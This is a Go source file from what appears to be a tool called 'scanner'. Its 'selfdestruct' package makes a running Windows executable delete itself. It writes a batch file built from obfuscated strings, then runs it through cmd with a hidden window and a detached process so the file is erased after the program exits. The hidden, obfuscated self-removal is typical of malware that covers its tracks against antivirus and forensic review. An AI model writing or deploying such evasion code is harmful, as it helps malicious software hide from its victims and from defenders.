//go:build windows
// +build windows

package selfdestruct

import (
	"os"
	"os/exec"
	"strings"
	"syscall"

	"scanner/internal/obfuscate"
)

func DeleteExecutable(exePath string) error {
	if exePath == "" {
		p, err := os.Executable()
		if err != nil {
			return err
		}
		exePath = p
	}

	tmp, err := os.CreateTemp("", obfuscate.BAT_PREFIX())
	if err != nil {
		return err
	}
	tmpName := tmp.Name()
	// The bat retries the deletion in a loop (up to 15 tries, ~1s apart):
	// a single del can silently fail while the exe is still locked
	// (antivirus scan, slow handle release).
	// NOTE: plain placeholder substitution, NOT fmt.Sprintf — the bat is full
	// of %VAR% syntax that Sprintf would mangle (e.g. %T -> type verb).
	content := strings.ReplaceAll(obfuscate.DEL_FMT(), "@EXEPATH@", exePath)

	if _, err := tmp.WriteString(content); err != nil {
		return err
	}
	tmp.Close()

	c := exec.Command(obfuscate.CMD(), obfuscate.CMD_C(), tmpName)
	c.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: syscall.CREATE_NEW_PROCESS_GROUP | 0x00000008,
	}
	return c.Start()
}
